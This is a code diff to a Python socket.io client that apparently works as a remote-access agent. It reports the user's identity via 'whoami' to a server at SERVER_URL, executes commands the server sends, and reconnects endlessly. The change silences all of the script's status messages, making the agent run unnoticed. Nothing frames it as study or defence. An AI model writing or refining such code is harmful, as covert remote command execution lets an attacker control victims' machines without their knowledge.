@@ -68,15 +68,16 @@ def executeCommand(command):
 @sio.event
 def connect():
     sio.emit("name", {"name" : os.popen("whoami").read()})
-    print("I'm connected boi")
+    #print("I'm connected boi")
 
 @sio.event
 def connect_error(data):
-    print("The connection failed!")
+    pass
+    #print("The connection failed!")
 
 @sio.event
 def message(data):
-    print('I received a message!')
+    #print('I received a message!')
     if (data["type"] == "msg"):
         print(data["msg"])
     elif (data["type"] == "command"):
@@ -84,11 +85,13 @@ def message(data):
 
 @sio.event
 def disconnect():
-    print("Server isn't running anymore :(")
+    pass
+    #print("Server isn't running anymore :(")
 
 while (not(sio.connected)):
     try:
         sio.connect(SERVER_URL)
     except:
-        print("Server not running")
+        pass
+        #print("Server not running")
     sleep(3)
